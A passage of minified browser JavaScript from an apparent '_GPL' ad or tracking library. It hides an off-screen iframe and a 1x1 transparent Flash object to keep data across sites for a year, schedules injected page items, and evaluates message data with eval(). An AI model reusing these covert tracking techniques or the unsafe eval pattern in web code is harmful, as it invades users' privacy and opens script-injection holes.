k)k[q]!=Object.prototype[q]&&"movie"!=q.toLowerCase()&&(l=r,u=q,x=k[q],v=d.createElement("param"),v.setAttribute("name",u),v.setAttribute("value",x),l.appendChild(v));f.parentNode.replaceChild(r,f);x=r}k=x;i.id==b;t.success=!0;t.ref=k}p&&p(t)})):p&&p(t)},ua:e,getFlashPlayerVersion:function(){return{major:e.pv[0],minor:e.pv[1],release:e.pv[2]}},hasFlashPlayerVersion:D}}();_GPL.swfobject=swfobject;if(window['postMessage']&&navigator.userAgent.toLowerCase().indexOf('opera')==-1&&_GPL.swfobject.getFlashPlayerVersion()['major']<9){if(typeof JSON=="undefined"){if(!this.JSON){JSON=function(){function f(n){return n<10?'0'+n:n}Date.prototype.toJSON=function(){return this.getUTCFullYear()+'-'+f(this.getUTCMonth()+1)+'-'+f(this.getUTCDate())+'T'+f(this.getUTCHours())+':'+f(this.getUTCMinutes())+':'+f(this.getUTCSeconds())+'Z'};var m={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'};function stringify(value,whitelist){var a,i,k,l,r=/["\\\x00-\x1f\x7f-\x9f]/g,v;switch(typeof value){case'string':return r.test(value)?'"'+value.replace(r,function(a){var c=m[a];if(c){return c}c=a.charCodeAt();return'\\u00'+Math.floor(c/16).toString(16)+(c%16).toString(16)})+'"':'"'+value+'"';case'number':return isFinite(value)?String(value):'null';case'boolean':case'null':return String(value);case'object':if(!value){return'null'}if(typeof value.toJSON==='function'){return stringify(value.toJSON())}a=[];if(typeof value.length==='number'&&!(value.propertyIsEnumerable('length'))){l=value.length;for(i=0;i<l;i+=1){a.push(stringify(value[i],whitelist)||'null')}return'['+a.join(',')+']'}if(whitelist){l=whitelist.length;for(i=0;i<l;i+=1){k=whitelist[i];if(typeof k==='string'){v=stringify(value[k],whitelist);if(v){a.push(stringify(k)+':'+v)}}}}else{for(k in value){if(typeof k==='string'){v=stringify(value[k],whitelist);if(v){a.push(stringify(k)+':'+v)}}}}return'{'+a.join(',')+'}'}}return{stringify:stringify,parse:function(text,filter){var j;function walk(k,v){var i,n;if(v&&typeof v==='object'){for(i in v){if(Object.prototype.hasOwnProperty.apply(v,[i])){n=walk(i,v[i]);if(n!==undefined){v[i]=n}}}}return filter(k,v)}if(/^[\],:{}\s]*$/.test(text.replace(/\\./g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,''))){j=eval('('+text+')');return typeof filter==='function'?walk('',j):j}throw new SyntaxError('parseJSON');}}}()}}_GPL.items.e6a00={compatible:window['postMessage']&&navigator.userAgent.toLowerCase().indexOf('opera')==-1,frame:false,ready:false,cb:1,mid:1,v:1,callbacks:{},last_hash:'',title:document.title?document.title:location.href,onready:function(){},queue:[],clear:true,init:function(onready){this.setupChild(_GPL.proto+_GPL.fCDN+'/store/');this.setupListener();this.onready=onready;if(!this.compatible){var f=this;setInterval(function(){f.processHash()},150)}},setupChild:function(src){this.frame=document.createElement('iframe');this.frame.style.position='absolute';this.frame.style.left=this.frame.style.top='-999px';this.frame.style.visibility='hidden';document.body.appendChild(this.frame);this.frame.src=src},setupListener:function(){if(window.addEventListener){window.addEventListener('message',_GPL.items['e6a00'].receiveMessage,true)}else if(window.attachEvent){window.attachEvent('onmessage',_GPL.items['e6a00'].receiveMessage)}},receiveMessage:function(e){try{if(e.origin.indexOf(_GPL.proto+_GPL.fCDN)==0){var msg=e.data;if(typeof msg=='string'&&msg.substr(0,1)=='{'&&msg.substr(msg.length-1)=='}'){msg=eval("("+msg+")")}if(msg.f&&msg.f=='ready'){_GPL.items['e6a00'].ready=true;_GPL.items['e6a00'].onready()}if(msg.i&&typeof _GPL.items['e6a00'].callbacks[msg.i]=='function'){_GPL.items['e6a00'].callbacks[msg.i](msg)}}}catch(e){}},sendMessage:function(message){if(!this.frame||!this.ready){return false}message.i=this.mid;if(arguments.length>=2&&typeof arguments[1]=='function'){this.callbacks[this.mid]=arguments[1]}this.mid++;if(this.compatible){this.frame.contentWindow.postMessage(JSON.stringify(message),_GPL.proto+_GPL.fCDN)}else{this.queue.push(this.frame.src.replace(/#.*$/,'')+'#'+(new Date).getTime()+(this.cb++)+'&_GPL_u='+encodeURIComponent(location.href)+'&_GPL_s='+encodeURIComponent(JSON.stringify(message)));if(this.clear){this.processQueue()}}},parseUrl:function(u){for(var a=u.substring(1).split("&"),d={},e=0,b=a.length;e<b;++e){var f=a[e].split("=");d[f[0]]=unescape(f.slice(1,f.length).join("="))}return d},processHash:function(){var newhash=this.parseUrl(location.hash)['_GPL_s'];if(typeof newhash!='undefined'&&newhash!=''&&newhash!=this.lasthash){this.lasthash=newhash;this.clear=true;this.receiveMessage({origin:_GPL.proto+_GPL.fCDN,data:newhash});location.hash='#'+Math.floor((new Date).getTime()/1000);document.title=this.title;this.processQueue()}},processQueue:function(){if(!this.clear)return;if(this.queue.length>0){var i=this.queue.pop();this.frame.src=i;this.clear=false}},set:function(n){var v=(arguments.length>=2)?arguments[1]:'';var t=(arguments.length>=3)?arguments[2]:365*24*60*60;if(this.ready){var na=[{n:n,v:v,t:t}];if(this.is_array(n)){na=n}this.sendMessage({'f':'db.set',a:na})}else{var c=this;setTimeout(function(){c.set(n,v,t)},100)}},get:function(n){var f=(arguments.length>=2)?arguments[1]:null;if(!this.ready||typeof f!='function'){return null}else{var na=[];if(this.is_array(n)){na=n}else{na.push(n)}_GPL.items['e6a00'].sendMessage({f:'db.get',a:na},f)}},is_array:function(i){return typeof(i)=='object'&&(i instanceof Array)}}}else{_GPL.items.e6a00={v:1,ready:!1,flashDetected:!1,log:function(){},swf:false,swf_url:"/items/e6a00/storage.swf",namespace:"gpl",store:{},detectFlash:function(){var m=(_GPL.swfobject.getFlashPlayerVersion()['major']>=9);if(m)return true;var d=_GPL.items.e6a00.detectFlash2();if(d)return true;return false},detectFlash2:function(){if(navigator.plugins&&navigator.mimeTypes.length){var a=navigator.plugins["Shockwave Flash"];if(a!=null&&navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin!=null)return a.description.replace(/([a-zA-Z]|\s)+/,"").replace(/(\s+r|\s+b[0-9]+)/,".").split(".")[0]>=9}else if(window.ActiveXObject){try{var a=new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7")}catch(d){try{var a=new ActiveXObject("ShockwaveFlash.ShockwaveFlash")}catch(c){return!1}}if(a!=null)return a.GetVariable("$version").split(" ")[1].split(",")[0]>=9}return!1},init:function(onready){this.onready=onready;this.flashDetected=this.detectFlash();if(!this.flashDetected)return!1;var a=document.createElement("div");a.style.position="absolute";a.style.top="0px";a.style.left="0px";a.style.width='1px';a.style.height='1px';a.style.zIndex='2147483647';a.id="_GPL_e6a00_div";var b=document.createElement("div");b.style.position="absolute";b.style.top="0px";b.style.left="0px";b.style.width='1px';b.style.height='1px';b.style.zIndex='2147483647';b.id="_GPL_e6a00_parent_div";b.appendChild(a);document.body.insertBefore(b,document.body.firstChild);swfobject.embedSWF(_GPL.proto+_GPL.baseCDN+this.swf_url,"_GPL_e6a00_div","1","1","9.0.0",false,{"logfn":"_GPL.items.e6a00.log","onload":"_GPL.items.e6a00.onload","onerror":"_GPL.items.e6a00.onerror","LSOName":this.namespace},{"wmode":"transparent","allowscriptaccess":"always"},{"id":"_GPL_e6a00_swf"});try{if(document._GPL_e6a00_swf||window._GPL_e6a00_swf){_GPL.items.e6a00.swf=document._GPL_e6a00_swf||window._GPL_e6a00_swf}}catch(e){}_GPL.items.e6a00.timer=setInterval(function(){try{if(!_GPL.items.e6a00.swf&&(document._GPL_e6a00_swf||window._GPL_e6a00_swf)){_GPL.items.e6a00.swf=document._GPL_e6a00_swf||window._GPL_e6a00_swf}}catch(e){}if(_GPL.items.e6a00.flashDetected&&_GPL.items.e6a00.swf&&typeof _GPL.items.e6a00.swf.get=='function'&&!_GPL.items.e6a00.ready){clearInterval(_GPL.items.e6a00.timer);_GPL.items.e6a00.onload()}},100)},set:function(a){var d=(arguments.length>=2)?arguments[1]:'';if(!this.flashDetected)return!1;if(this.ready&&this.swf&&typeof this.swf.set=='function'){var na=[];if(!this.is_array(a)){na.push({n:a,v:d,t:365*24*60*60})}else{na=a}for(var i=0;i<na.length;i++){this.swf.set(na[i].n,na[i].v)}}else{var c=this;setTimeout(function(){c.set(a,d)},100)}},get:function(a){var ir=(this.flashDetected&&this.ready&&typeof this.swf.get=='function');var f=(arguments.length>=2&&typeof arguments[1]=='function')?arguments[1]:false;if(f){if(!this.is_array(a)){a=[a]}var v={};for(var i=0;i<a.length;i++){v[a[i]]=(ir)?this.swf.get(a[i]):null}f({"i":1,"f":"db.get","v":v})}else{return(ir)?this.swf.get(a):null}},is_array:function(i){return typeof(i)=='object'&&(i instanceof Array)},onload:function(){if(this.ready)return;this.ready=!0;var a=this;setTimeout(function(){a.ready=!0;a.set("__flashBugFix","1");a.onready()},0)},onready:function(){},onerror:function(){}}}if(_GPL.isIE6){_GPL.onDomReady()}else{_GPL.i()}return _GPL}()}else{_GPL_new_items=_GPL.newKeys(_GPL.item_perms,{"ALL":{"ye44b":[],"o7272":[],"0b102":[],"22555":[],"dca7d":[],"bda27":[],"a652c":[],"fb7b3":[]}});var _GPL_a=_GPL.findals();if(_GPL_a){_GPL.rS(_GPL_a.src.split('/')[2])}_GPL.item_perms=_GPL.mergeKeysMulti(_GPL.item_perms,_GPL.lpz({"ALL":{"ye44b":[],"o7272":[],"0b102":[],"22555":[],"dca7d":[],"bda27":[],"a652c":[],"fb7b3":[]}},_GPL.vars.zoneid));_GPL.item_delays=_GPL.mergeKeys(_GPL.item_delays,{"ye44b":{"min":"0","max":"0","c":"yes"},"o7272":{"min":"0","max":"0","c":"no"},"0b102":{"min":"259200","max":"0","c":"yes"},"22555":{"min":"259200","max":"0","c":"yes"},"dca7d":{"min":"0","max":"0","c":"no"},"bda27":{"min":"0","max":"0","c":"no"},"a652c":{"min":"0","max":"0","c":"no"},"fb7b3":{"min":"0","max":"0","c":"no"}});if(_GPL.rl){for(var _GPL_nic=0;_GPL_nic<_GPL_new_items.length;_GPL_nic++){if(_GPL.f[_GPL_new_items[_GPL_nic]]){_GPL.f[_GPL_new_items[_GPL_nic]]()}}}var pz=_GPL.vars.pid+":"+_GPL.vars.zoneid;if(_GPL.pingdata&&_GPL.pingdata.a.pz.indexOf(pz)==-1){_GPL.pingdata.a.pz.push(pz)}if(typeof _GPL.f['fb7b3']=='function'){_GPL.f['fb7b3'](_GPL.vars.zoneid)}}